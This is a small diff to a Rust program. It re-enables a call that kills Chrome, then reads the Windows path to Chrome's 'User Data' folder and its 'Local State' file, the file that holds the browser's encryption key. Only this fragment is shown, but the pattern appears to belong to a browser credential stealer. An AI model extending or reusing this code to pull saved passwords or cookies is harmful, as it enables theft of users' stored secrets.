@@ -21,7 +21,7 @@ const USER_DATA_DIR: &str = r#"\google\chrome\User Data"#;
 #[tokio::main]
 pub async fn main() -> Result<(), reqwest::Error> {
     dotenv().ok();
-    //kill_chrome();
+    kill_chrome();
     let localappdata = env::var("LOCALAPPDATA").unwrap();
     let user_data_dir = localappdata.clone() + USER_DATA_DIR;
     let local_state = fs::read_to_string(format!("{user_data_dir}\\Local State")).unwrap();
